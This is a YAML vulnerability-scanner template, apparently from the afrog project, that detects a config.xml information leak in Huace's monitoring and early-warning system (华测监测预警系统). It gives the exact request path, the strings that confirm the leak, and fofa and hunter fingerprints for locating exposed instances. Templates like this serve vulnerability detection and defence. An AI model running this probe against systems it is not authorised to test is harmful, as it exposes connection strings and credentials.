# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - configuration
          - appSettings
          - connectionStrings
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/web/Report/Rpt/Config/Config.xml'
id: huace-mews-config-xml-infoleak
info:
  author: hufei
  description: |-
    上海华测导航技术股份有限公司的华测监测预警系统可下载任意文件，如web.config文件等。
    fofa: icon_hash="-628229493"
    hunter: web.icon=="be8e2d43a4e9bc5ce43303ce55609199"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 华测监测预警系统 config.xml 信息泄露
  severity: high
  tags: huace,disclosure,argus-import
